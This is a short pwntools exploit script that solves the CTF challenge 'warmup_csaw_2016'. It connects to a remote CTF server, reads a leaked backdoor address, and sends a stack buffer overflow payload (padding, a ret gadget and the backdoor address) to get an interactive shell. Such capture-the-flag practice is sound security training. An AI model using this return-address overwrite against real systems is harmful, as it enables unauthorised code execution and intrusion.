from pwn import *

ret = 0x00000000004004a1

#io = process("./warmup_csaw_2016")
io = remote("5ed3c8359e8b42aa3f69b677.tcp-ctf2.dasctf.com", 9999, ssl=True)
io.recvuntil(b"WOW:")
backdoor = int(io.recv(8), 16)
payload = b"a" * (0x40+8) + p64(ret) + p64(backdoor)
io.sendline(payload)
io.interactive()

